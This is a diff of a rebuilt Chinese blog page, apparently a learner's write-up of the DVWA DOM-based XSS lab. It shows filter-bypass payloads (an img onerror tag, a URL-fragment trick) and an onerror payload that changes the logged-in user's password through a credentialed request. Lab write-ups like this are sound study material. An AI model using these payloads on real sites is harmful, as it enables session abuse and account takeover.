@@ -1,41 +1,14 @@
 <!doctype html><html lang=zh-cn dir=ltr>
 <head><meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="前言 终于做到了XSS题。先尝试把DOM型XSS做完。
-原理 用JavaScript操作dom的时候没对用户数据做好过滤，导致将用户数据当HTML/JS解释执行。
-解题 Low难度：收集信息 所有值得关注的东西就是这些。
-目标是获取用户的 Cookie。这里就尝试发起一个 CSRF攻击。
-Low难度：解题 两个写入DOM的地方，一个是 + lang +，一个是 decodeURI(lang)。decodeURI更好操作一些，尝试注入一个合法标签，直接写&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;。
-注入成功。
-Medium难度：解题 惊了，看起来js没变化。
-if (document.location.href.indexOf(&amp;#34;default=&amp;#34;) &amp;gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&amp;#34;default=&amp;#34;)+8); document.write(&amp;#34;&amp;lt;option value=&amp;#39;&amp;#34; + lang + &amp;#34;&amp;#39;&amp;gt;&amp;#34; + decodeURI(lang) + &amp;#34;&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;&amp;#39; disabled=&amp;#39;disabled&amp;#39;&amp;gt;----&amp;lt;/option&amp;gt;&amp;#34;); } document.write(&amp;#34;&amp;lt;option value=&amp;#39;English&amp;#39;&amp;gt;English&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;French&amp;#39;&amp;gt;French&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;Spanish&amp;#39;&amp;gt;Spanish&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;German&amp;#39;&amp;gt;German&amp;lt;/option&amp;gt;&amp;#34;); 尝试用Low难度的payload，发现被跳转：
-大概是做了过滤，虽然有网上随便找的一堆 xss payload 但不想无脑试过去。看一眼源码。
-&amp;lt;?php // Is there any input? if ( array_key_exists( &amp;#34;default&amp;#34;, $_GET ) &amp;amp;&amp;amp; !is_null ($_GET[ &amp;#39;default&amp;#39; ]) ) { $default = $_GET[&amp;#39;default&amp;#39;]; # Do not allow script tags  if (stripos ($default, &amp;#34;&amp;lt;script&amp;#34;) !"><title>DVWA上手记录-DOM型XSS</title>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="前言 终于做到了XSS题。先尝试把DOM型XSS做完。 原理 用JavaScript操作dom的时候没对用户数据做好过滤，导致将用户数据当HTML"><title>DVWA上手记录-DOM型XSS</title>
 <link rel=canonical href=https://nnnewb.github.io/blog/p/get-start-dvwa-09/>
-<link rel=stylesheet href=/blog/scss/style.min.b80bf249ce4a22cf55e8d7340a0b37a2f2c10f54f3a9a49cb94b694a2eb0bbea.css><meta property="og:title" content="DVWA上手记录-DOM型XSS">
-<meta property="og:description" content="前言 终于做到了XSS题。先尝试把DOM型XSS做完。
-原理 用JavaScript操作dom的时候没对用户数据做好过滤，导致将用户数据当HTML/JS解释执行。
-解题 Low难度：收集信息 所有值得关注的东西就是这些。
-目标是获取用户的 Cookie。这里就尝试发起一个 CSRF攻击。
-Low难度：解题 两个写入DOM的地方，一个是 + lang +，一个是 decodeURI(lang)。decodeURI更好操作一些，尝试注入一个合法标签，直接写&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;。
-注入成功。
-Medium难度：解题 惊了，看起来js没变化。
-if (document.location.href.indexOf(&amp;#34;default=&amp;#34;) &amp;gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&amp;#34;default=&amp;#34;)+8); document.write(&amp;#34;&amp;lt;option value=&amp;#39;&amp;#34; + lang + &amp;#34;&amp;#39;&amp;gt;&amp;#34; + decodeURI(lang) + &amp;#34;&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;&amp;#39; disabled=&amp;#39;disabled&amp;#39;&amp;gt;----&amp;lt;/option&amp;gt;&amp;#34;); } document.write(&amp;#34;&amp;lt;option value=&amp;#39;English&amp;#39;&amp;gt;English&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;French&amp;#39;&amp;gt;French&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;Spanish&amp;#39;&amp;gt;Spanish&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;German&amp;#39;&amp;gt;German&amp;lt;/option&amp;gt;&amp;#34;); 尝试用Low难度的payload，发现被跳转：
-大概是做了过滤，虽然有网上随便找的一堆 xss payload 但不想无脑试过去。看一眼源码。
-&amp;lt;?php // Is there any input? if ( array_key_exists( &amp;#34;default&amp;#34;, $_GET ) &amp;amp;&amp;amp; !is_null ($_GET[ &amp;#39;default&amp;#39; ]) ) { $default = $_GET[&amp;#39;default&amp;#39;]; # Do not allow script tags  if (stripos ($default, &amp;#34;&amp;lt;script&amp;#34;) !">
+<link rel=stylesheet href=/blog/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css><meta property="og:title" content="DVWA上手记录-DOM型XSS">
+<meta property="og:description" content="前言 终于做到了XSS题。先尝试把DOM型XSS做完。 原理 用JavaScript操作dom的时候没对用户数据做好过滤，导致将用户数据当HTML">
 <meta property="og:url" content="https://nnnewb.github.io/blog/p/get-start-dvwa-09/">
 <meta property="og:site_name" content="weakptr's 笔记">
 <meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="security"><meta property="article:tag" content="dvwa"><meta property="article:published_time" content="2022-04-28T15:17:00+08:00"><meta property="article:modified_time" content="2022-04-28T15:17:00+08:00">
 <meta name=twitter:title content="DVWA上手记录-DOM型XSS">
-<meta name=twitter:description content="前言 终于做到了XSS题。先尝试把DOM型XSS做完。
-原理 用JavaScript操作dom的时候没对用户数据做好过滤，导致将用户数据当HTML/JS解释执行。
-解题 Low难度：收集信息 所有值得关注的东西就是这些。
-目标是获取用户的 Cookie。这里就尝试发起一个 CSRF攻击。
-Low难度：解题 两个写入DOM的地方，一个是 + lang +，一个是 decodeURI(lang)。decodeURI更好操作一些，尝试注入一个合法标签，直接写&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;。
-注入成功。
-Medium难度：解题 惊了，看起来js没变化。
-if (document.location.href.indexOf(&amp;#34;default=&amp;#34;) &amp;gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&amp;#34;default=&amp;#34;)+8); document.write(&amp;#34;&amp;lt;option value=&amp;#39;&amp;#34; + lang + &amp;#34;&amp;#39;&amp;gt;&amp;#34; + decodeURI(lang) + &amp;#34;&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;&amp;#39; disabled=&amp;#39;disabled&amp;#39;&amp;gt;----&amp;lt;/option&amp;gt;&amp;#34;); } document.write(&amp;#34;&amp;lt;option value=&amp;#39;English&amp;#39;&amp;gt;English&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;French&amp;#39;&amp;gt;French&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;Spanish&amp;#39;&amp;gt;Spanish&amp;lt;/option&amp;gt;&amp;#34;); document.write(&amp;#34;&amp;lt;option value=&amp;#39;German&amp;#39;&amp;gt;German&amp;lt;/option&amp;gt;&amp;#34;); 尝试用Low难度的payload，发现被跳转：
-大概是做了过滤，虽然有网上随便找的一堆 xss payload 但不想无脑试过去。看一眼源码。
-&amp;lt;?php // Is there any input? if ( array_key_exists( &amp;#34;default&amp;#34;, $_GET ) &amp;amp;&amp;amp; !is_null ($_GET[ &amp;#39;default&amp;#39; ]) ) { $default = $_GET[&amp;#39;default&amp;#39;]; # Do not allow script tags  if (stripos ($default, &amp;#34;&amp;lt;script&amp;#34;) !">
+<meta name=twitter:description content="前言 终于做到了XSS题。先尝试把DOM型XSS做完。 原理 用JavaScript操作dom的时候没对用户数据做好过滤，导致将用户数据当HTML">
 </head>
 <body class=article-page>
 <script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"dark")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
@@ -56,7 +29,12 @@ if (document.location.href.indexOf(&amp;#34;default=&amp;#34;) &amp;gt;= 0) { va
 <h1 class=site-name><a href=/blog>weakptr's 笔记</a></h1>
 <h2 class=site-description>弃船！</h2>
 </div>
-</header><ol class=menu id=main-menu>
+</header><ol class=social-menu>
+<li>
+<a href=https://github.com/nnnewb/ target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg>
+</a>
+</li>
+</ol><ol class=menu id=main-menu>
 <li>
 <a href=/blog><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
 <span>首页</span>
@@ -80,6 +58,11 @@ if (document.location.href.indexOf(&amp;#34;default=&amp;#34;) &amp;gt;= 0) { va
 <li>
 <a href=/blog/link><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
 <span>友链</span>
+</a>
+</li>
+<li>
+<a href=/blog/search><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>搜索</span>
 </a>
 </li>
 <div class=menu-bottom-section>
@@ -109,7 +92,7 @@ security
 </div>
 <div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
 <time class=article-time--reading>
-阅读时长: 2 分钟
+阅读时长: 3 分钟
 </time>
 </div>
 </footer>
@@ -133,7 +116,21 @@ security
 <p>注入成功。</p>
 <h3 id=medium难度解题>Medium难度：解题</h3>
 <p>惊了，看起来js没变化。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=k>if</span> <span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s2>&#34;default=&#34;</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=k>if</span> <span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s2>&#34;default=&#34;</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
     <span class=kd>var</span> <span class=nx>lang</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s2>&#34;default=&#34;</span><span class=p>)</span><span class=o>+</span><span class=mi>8</span><span class=p>);</span>
     <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=s2>&#34;&lt;option value=&#39;&#34;</span> <span class=o>+</span> <span class=nx>lang</span> <span class=o>+</span> <span class=s2>&#34;&#39;&gt;&#34;</span> <span class=o>+</span> <span class=nb>decodeURI</span><span class=p>(</span><span class=nx>lang</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;&lt;/option&gt;&#34;</span><span class=p>);</span>
     <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=s2>&#34;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&#34;</span><span class=p>);</span>
@@ -143,10 +140,31 @@ security
 <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=s2>&#34;&lt;option value=&#39;French&#39;&gt;French&lt;/option&gt;&#34;</span><span class=p>);</span>
 <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=s2>&#34;&lt;option value=&#39;Spanish&#39;&gt;Spanish&lt;/option&gt;&#34;</span><span class=p>);</span>
 <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=s2>&#34;&lt;option value=&#39;German&#39;&gt;German&lt;/option&gt;&#34;</span><span class=p>);</span>
-</code></pre></div><p>尝试用Low难度的payload，发现被跳转：</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>尝试用Low难度的payload，发现被跳转：</p>
 <p><img src=/blog/p/get-start-dvwa-09/image-20220428142754536.png width=661 height=109 srcset="/blog/p/get-start-dvwa-09/image-20220428142754536_hua8a7f30740a75850eeb95c63d8fbbf4c_10513_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-09/image-20220428142754536_hua8a7f30740a75850eeb95c63d8fbbf4c_10513_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220428142754536 class=gallery-image data-flex-grow=606 data-flex-basis=1455px></p>
 <p>大概是做了过滤，虽然有网上随便找的一堆 xss payload 但不想无脑试过去。看一眼源码。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-php data-lang=php>
 <span class=o>&lt;?</span><span class=nx>php</span>
 
 <span class=c1>// Is there any input?
@@ -161,14 +179,47 @@ security
 <span class=p>}</span>
 
 <span class=cp>?&gt;</span><span class=err>
-</span></code></pre></div><p>一个很鸡的过滤，<code>stripos</code>忽略大小写所以大小写 bypass 不行，一次 URI 编码也不行。考虑不用 <code>script</code> 标签，直接把 <code>option</code>和<code>select</code> 标签闭合了，然后插一个别的标签比如<code>img</code>。</p>
+</span></code></pre></td></tr></table>
+</div>
+</div><p>一个很鸡的过滤，<code>stripos</code>忽略大小写所以大小写 bypass 不行，一次 URI 编码也不行。考虑不用 <code>script</code> 标签，直接把 <code>option</code>和<code>select</code> 标签闭合了，然后插一个别的标签比如<code>img</code>。</p>
 <p>payload就改成这样。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;/</span><span class=nt>option</span><span class=p>&gt;&lt;/</span><span class=nt>select</span><span class=p>&gt;&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>onerror</span><span class=o>=</span><span class=s>alert(1)</span><span class=p>&gt;</span>
-</code></pre></div><p><img src=/blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961.png width=761 height=166 srcset="/blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961_hu65f6cd5bc521de2989168b02384fe0f3_8138_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961_hu65f6cd5bc521de2989168b02384fe0f3_8138_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220428144330839 class=gallery-image data-flex-grow=458 data-flex-basis=1100px></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;/</span><span class=nt>option</span><span class=p>&gt;&lt;/</span><span class=nt>select</span><span class=p>&gt;&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>onerror</span><span class=o>=</span><span class=s>alert(1)</span><span class=p>&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src=/blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961.png width=761 height=166 srcset="/blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961_hu65f6cd5bc521de2989168b02384fe0f3_8138_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-09/image-20220428144330839-16511282123961_hu65f6cd5bc521de2989168b02384fe0f3_8138_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220428144330839 class=gallery-image data-flex-grow=458 data-flex-basis=1100px></p>
 <p>也暴力解开了。</p>
 <h3 id=high难度解题>High难度：解题</h3>
 <p>还是直接试一次刚才的payload，果不其然302了。看看代码。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
 
 <span class=c1>// Is there any input?
 </span><span class=c1></span><span class=k>if</span> <span class=p>(</span> <span class=nx>array_key_exists</span><span class=p>(</span> <span class=s2>&#34;default&#34;</span><span class=p>,</span> <span class=nv>$_GET</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>is_null</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;default&#39;</span> <span class=p>])</span> <span class=p>)</span> <span class=p>{</span>
@@ -188,19 +239,35 @@ security
 <span class=p>}</span>
 
 <span class=cp>?&gt;</span><span class=err>
-</span></code></pre></div><p>白名单？这我有点不懂了。想一想先。</p>
+</span></code></pre></td></tr></table>
+</div>
+</div><p>白名单？这我有点不懂了。想一想先。</p>
 <p>想 bypass 显然不能等进入 <code>switch</code>，只能在 <code>if</code> 这里就直接过，所以问题就是<code>array_key_exists</code>和<code>is_null</code>这两个函数能不能 bypass 。</p>
 <p>没什么用的分析略，行不通。</p>
 <p>不过还是有办法，可以用 URL 里的 Fragment。（url里的<code>#fragment</code>部分）。因为JS代码里是这么写的：</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>var</span> <span class=nx>lang</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s2>&#34;default=&#34;</span><span class=p>)</span><span class=o>+</span><span class=mi>8</span><span class=p>);</span>
-</code></pre></div><p>直接从<code>href</code>里取<code>substring</code>，偏移值是<code>href.indexOf</code>获得，并没有考虑是从 QueryString 还是 Fragment 取值。所以完全可以把原先的payload加上一个<code>#</code>解决问题。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>var</span> <span class=nx>lang</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s2>&#34;default=&#34;</span><span class=p>)</span><span class=o>+</span><span class=mi>8</span><span class=p>);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>直接从<code>href</code>里取<code>substring</code>，偏移值是<code>href.indexOf</code>获得，并没有考虑是从 QueryString 还是 Fragment 取值。所以完全可以把原先的payload加上一个<code>#</code>解决问题。</p>
 <p><img src=/blog/p/get-start-dvwa-09/image-20220428145238725.png width=676 height=169 srcset="/blog/p/get-start-dvwa-09/image-20220428145238725_huaa39aeb0cde7b5644c845b1eb10671f0_7523_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-09/image-20220428145238725_huaa39aeb0cde7b5644c845b1eb10671f0_7523_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220428145238725 class=gallery-image data-flex-grow=400 data-flex-basis=960px></p>
 <p>好吧，我承认看了下帮助，差点钻了php的牛角尖，去硬找方法 bypass 服务端的检查。</p>
 <h3 id=csrf解题>CSRF：解题</h3>
 <p>主要是解决 Cookies 默认 <code>samesite: lax</code> 导致的 xhr 行不通的问题。</p>
 <p>把 payload 改成下面这样。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;/</span><span class=nt>option</span><span class=p>&gt;&lt;/</span><span class=nt>select</span><span class=p>&gt;&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>onerror</span><span class=o>=</span><span class=s>&#34;let xhr = new XMLHttpRequest(); xhr.open(&#39;get&#39;, &#39;http://localhost:8080/vulnerabilities/csrf/?password_new=xss&amp;password_conf=xss&amp;Change=Change&#39;); xhr.withCredentials=true; xhr.send();&#34;</span><span class=p>&gt;</span>
-</code></pre></div><p><img src=/blog/p/get-start-dvwa-09/image-20220428150236560.png width=1412 height=76 srcset="/blog/p/get-start-dvwa-09/image-20220428150236560_hub28227194eb20365c2c5c05d48f1819b_17488_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-09/image-20220428150236560_hub28227194eb20365c2c5c05d48f1819b_17488_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220428150236560 class=gallery-image data-flex-grow=1857 data-flex-basis=4458px></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;/</span><span class=nt>option</span><span class=p>&gt;&lt;/</span><span class=nt>select</span><span class=p>&gt;&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>onerror</span><span class=o>=</span><span class=s>&#34;let xhr = new XMLHttpRequest(); xhr.open(&#39;get&#39;, &#39;http://localhost:8080/vulnerabilities/csrf/?password_new=xss&amp;password_conf=xss&amp;Change=Change&#39;); xhr.withCredentials=true; xhr.send();&#34;</span><span class=p>&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src=/blog/p/get-start-dvwa-09/image-20220428150236560.png width=1412 height=76 srcset="/blog/p/get-start-dvwa-09/image-20220428150236560_hub28227194eb20365c2c5c05d48f1819b_17488_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-09/image-20220428150236560_hub28227194eb20365c2c5c05d48f1819b_17488_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220428150236560 class=gallery-image data-flex-grow=1857 data-flex-basis=4458px></p>
 <p><img src=/blog/p/get-start-dvwa-09/image-20220428150255678.png width=405 height=86 srcset="/blog/p/get-start-dvwa-09/image-20220428150255678_hu78ed2e3ce39efde3832f99f036b3e25d_6191_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-09/image-20220428150255678_hu78ed2e3ce39efde3832f99f036b3e25d_6191_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220428150255678 class=gallery-image data-flex-grow=470 data-flex-basis=1130px></p>
 <p>然后验证下修改的密码<code>xss</code>是否有效。</p>
 <p><img src=/blog/p/get-start-dvwa-09/image-20220428150319091.png width=219 height=164 srcset="/blog/p/get-start-dvwa-09/image-20220428150319091_hu37c43fb2e344f0a81362d8beb3bde604_3637_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-09/image-20220428150319091_hu37c43fb2e344f0a81362d8beb3bde604_3637_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220428150319091 class=gallery-image data-flex-grow=133 data-flex-basis=320px></p>
@@ -278,7 +345,7 @@ security
 <section class=powerby>
 GitHub Pages <br>
 Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
-Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.10.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
+主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.11.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计
 </section>
 </footer>
 <div class=pswp tabindex=-1 role=dialog aria-hidden=true>
